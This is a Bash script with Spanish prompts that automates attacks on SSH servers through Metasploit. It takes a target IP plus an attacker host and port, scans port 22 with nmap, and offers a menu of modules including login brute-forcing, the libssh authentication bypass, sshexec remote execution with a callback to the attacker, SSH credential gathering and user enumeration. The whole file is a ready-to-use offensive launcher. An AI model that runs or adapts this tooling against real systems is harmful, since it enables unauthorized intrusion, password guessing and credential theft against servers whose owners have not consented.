#!/bin/bash

# ─── Estilo y detección ────────────────────────────────────────────────────────
RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
NC="\033[0m"

ASCII_ART="
███████╗███████╗██╗  ██╗
██╔════╝██╔════╝██║ ██╔╝
███████╗█████╗  █████╔╝ 
╚════██║██╔══╝  ██╔═██╗ 
███████║███████╗██║  ██╗
╚══════╝╚══════╝╚═╝  ╚═╝
      Puerto 22 - SSH
"

echo -e "$BLUE$ASCII_ART$NC"
echo -e "${GREEN}[*] Validando herramientas necesarias...${NC}"
command -v nmap >/dev/null 2>&1 || { echo -e "${RED}[-] nmap no encontrado. Instálalo.${NC}"; exit 1; }
command -v xterm >/dev/null 2>&1 || { echo -e "${RED}[-] xterm no encontrado. Instálalo.${NC}"; exit 1; }
command -v msfconsole >/dev/null 2>&1 || { echo -e "${RED}[-] msfconsole no encontrado. Instálalo.${NC}"; exit 1; }

read -p "$(echo -e $YELLOW"RHOST objetivo (IP):"$NC )" RHOST
read -p "$(echo -e $YELLOW"LHOST atacante:"$NC )" LHOST
read -p "$(echo -e $YELLOW"LPORT escucha:"$NC )" LPORT

echo -e "${BLUE}[*] Escaneando puerto 22 con nmap...${NC}"
nmap -p22 -sV $RHOST

# ─── Menú de Exploits SSH ──────────────────────────────────────────────────────
while true; do
  echo -e "${GREEN}\nSelecciona un módulo SSH para ejecutar:${NC}"
  echo "1) auxiliary/scanner/ssh/ssh_version"
  echo "2) auxiliary/scanner/ssh/ssh_login"
  echo "3) auxiliary/scanner/ssh/ssh_login_pubkey"
  echo "4) auxiliary/scanner/ssh/libssh_auth_bypass"
  echo "5) exploit/unix/ssh/sshexec"
  echo "6) auxiliary/admin/ssh/sshexec"
  echo "7) post/linux/gather/ssh_creds"
  echo "8) exploit/multi/ssh/sshexec"
  echo "9) auxiliary/scanner/ssh/ssh_enumusers"
  echo "10) auxiliary/scanner/ssh/ssh_identify_pubkeys"
  echo "0) Salir"
  read -p "$(echo -e $YELLOW'Opción: '$NC)" opcion

  case $opcion in
    0) break ;;
    1) MOD="auxiliary/scanner/ssh/ssh_version" ;;
    2) MOD="auxiliary/scanner/ssh/ssh_login" ;;
    3) MOD="auxiliary/scanner/ssh/ssh_login_pubkey" ;;
    4) MOD="auxiliary/scanner/ssh/libssh_auth_bypass" ;;
    5) MOD="exploit/unix/ssh/sshexec" ;;
    6) MOD="auxiliary/admin/ssh/sshexec" ;;
    7) MOD="post/linux/gather/ssh_creds" ;;
    8) MOD="exploit/multi/ssh/sshexec" ;;
    9) MOD="auxiliary/scanner/ssh/ssh_enumusers" ;;
    10) MOD="auxiliary/scanner/ssh/ssh_identify_pubkeys" ;;
    *) echo -e "${RED}Opción inválida${NC}"; continue ;;
  esac

  echo -e "${YELLOW}[*] Variables del módulo seleccionado:$NC"
  xterm -hold -e "msfconsole -q -x 'use $MOD; show options; exit'" &

  read -p "$(echo -e $GREEN'Deseas ejecutar el exploit? (s/n): '$NC)" ejecutar
  if [[ $ejecutar == "s" ]]; then
    xterm -e "msfconsole -x 'use $MOD; set RHOST $RHOST; set LHOST $LHOST; set LPORT $LPORT; run; exit'" &
  fi
done
